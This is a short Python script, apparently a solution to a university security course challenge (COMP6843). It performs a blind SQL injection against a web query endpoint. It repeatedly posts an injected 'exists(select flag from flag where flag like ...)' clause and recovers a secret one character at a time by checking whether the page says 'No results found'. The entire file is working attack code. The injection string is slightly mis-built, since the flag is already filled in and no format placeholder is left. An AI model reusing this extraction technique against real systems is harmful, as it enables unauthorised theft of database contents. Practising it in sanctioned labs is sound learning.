#!/usr/bin/python

import requests
import sys

list = ['{','}','-','+',' ','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']

query = "' and name like 'Ab%' and exists(select flag from flag where flag like 'COMP6843{{e65e9af7-704a-4acd-944c-d67cb8dc3442}}') --"

exist = ""
found = False

while 1:
    found = False
    for i in range(len(list)):
        r = requests.post("http://slowpoke.ext.ns.agency/query", data={'query': query.format(exist + list[i])})
        if not "No results found" in r.text:
            exist += list[i]
            print exist
            found = True
            break
    if not found:        
        print "Finished"
        sys.exit(0)
